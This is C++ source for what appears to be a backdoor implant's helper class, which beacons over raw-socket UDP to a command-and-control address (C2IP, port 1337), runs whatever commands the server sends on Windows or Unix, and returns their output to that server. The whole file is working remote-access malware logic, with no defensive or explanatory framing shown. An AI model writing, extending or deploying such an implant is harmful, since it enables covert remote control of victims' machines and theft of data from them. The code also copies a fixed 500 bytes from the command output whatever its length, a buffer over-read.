#include "BPHelper.hpp"

std::mutex socketMutex;

int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
    std::lock_guard<std::mutex> g(socketMutex);
    std::string output = "";
    std::string rawCommand(reinterpret_cast<char *>(eventInfo->bpRawCommand.raw_command));

    switch (eventInfo->bpHeader.header_type) {
        case 0x02: {
            // execute command then respond
            std::cout << "Received a Command to Execute" << std::endl;
#if defined(_WIN32) || defined(WIN32)
            std::string del = " ";
            size_t found = rawCommand.find(del);
            std::string cmd, arguments;
            if (found != std::string::npos) {
                cmd = rawCommand.substr(0, rawCommand.find(del));
                arguments = rawCommand.substr(rawCommand.find(del), rawCommand.length() - 1);
            }
            else {
                cmd = rawCommand;
                arguments = "";
            }
            auto result = RunCommand(cmd, arguments);
            if (result->error) {
                output = result->std_error;
            }
            else {
                output = result->std_output;
            }
#else
            output = exec(rawCommand.c_str());
#endif

            PacketParse::bp_header_t bpHeader{};
            PacketParse::bp_response_t bp_response{};
            bpHeader.header_type = 0x03;
            bp_response.host_ip = rawSocket.getIP();
            bp_response.command_num = htonl(currentCmd);
            memcpy(bp_response.data, output.c_str(), 500);
            bp_response.data_len = htons(static_cast<uint16_t>(output.length()));

            auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
            auto bp_ptr = reinterpret_cast<unsigned char *>(&bp_response);

            std::vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
            payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_response));

#ifdef __unix__
       
            std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                                 C2IP,
                                                 1337,
                                                 1337,
                                                 payload,
                                                 rawSocket.getMac(),
                                                 nextHopMac);

#else
            std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                C2IP,
                1337,
                1337,
                payload);

#endif

            rawSocket.send(req);

            currentCmd++;
            return 1;
        }
        case 0x04: {
            // keep alive for future use
            std::cout << "Received a Keep Alive" << std::endl;
            if (eventInfo->bpKeepAlive.command_num == currentCmd) {
                currentCmd++;
            }
            return 1;
        }
        default: {
            std::cout << "Not a Command or Keep Alive" << std::endl;
            return -1;
        }
    }
}

void BPHelper::requestAction() {
    std::lock_guard<std::mutex> g(socketMutex);
    PacketParse::bp_header_t bpHeader{};
    PacketParse::bp_command_request_t bp_command_request_header{};
    bpHeader.header_type = 0x01;
    bp_command_request_header.target_OS = 0x01;
    bp_command_request_header.command_num = htonl(currentCmd);

    auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
    auto bp_ptr = reinterpret_cast<unsigned char *>(&bp_command_request_header);

    std::vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
    payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_command_request_header));

#if defined(_WIN32) || defined(WIN32)
    std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                            C2IP,
                                            1337,
                                            1337,
                                            payload);
    //Firewall Flick
    rawSocket.send(req);
#else
    std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                         C2IP,
                                         1337,
                                         1337,
                                         payload,
                                         rawSocket.getMac(),
                                         nextHopMac);
    rawSocket.send(req);
#endif
}

BPHelper::BPHelper() {
#ifdef __unix__
    rawSocket = RawSocket(C2IP);
    if (useGateway) {
        nextHopMac = rawSocket.getMacOfIP(ntohl(GatewayIP));
    } else {
        nextHopMac = rawSocket.getMacOfIP(ntohl(C2IP));
    }
#elif defined(_WIN32) || defined(WIN32)
    rawSocket = RawSocket(C2IP);
#endif
    currentCmd = 0;
}

void BPHelper::Receive() {
    while (true) {
        rawSocket.receive();
        Packet packet = rawSocket.getPacket();
        if (!packet.empty()) {
            std::unique_ptr<PacketParse::info_t> info = PacketParse::parsePacket(packet);
            if (info->bpHeader.magic_bytes == PacketParse::MAGIC_BYTES) {
                actionResponse(move(info));
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
}

void BPHelper::requestActionLoop(int interval) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(interval));
        this->requestAction();
    }
}

void BPHelper::requestActionThread() {
    std::thread t1(&BPHelper::requestActionLoop, this, requestActionInterval);
    t1.detach();
}


